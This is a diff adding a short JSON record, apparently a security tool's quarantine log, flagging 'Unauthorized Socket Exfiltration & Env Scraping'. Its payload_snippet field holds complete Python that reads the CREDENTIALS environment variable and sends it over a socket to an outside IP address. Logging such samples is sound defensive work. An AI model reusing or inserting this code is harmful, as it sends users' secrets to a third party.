@@ -1,0 +1,6 @@
+{
+    "timestamp": 1788578443,
+    "status": "QUARANTINED",
+    "threat_type": "Unauthorized Socket Exfiltration & Env Scraping",
+    "payload_snippet": "import socket\nimport os\n\ndef exfiltrate_environment():\n    target_ip = \"198.51.100.42\"\n    sensitive_data = os.environ.get(\"CREDENTIALS\", \"NO_KEY_FOUND\")\n    \n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((target_ip, 443))\n    s.sendall(sensitive_data.encode())\n    s.close()\n    \nexfiltrate_environment()"
+}
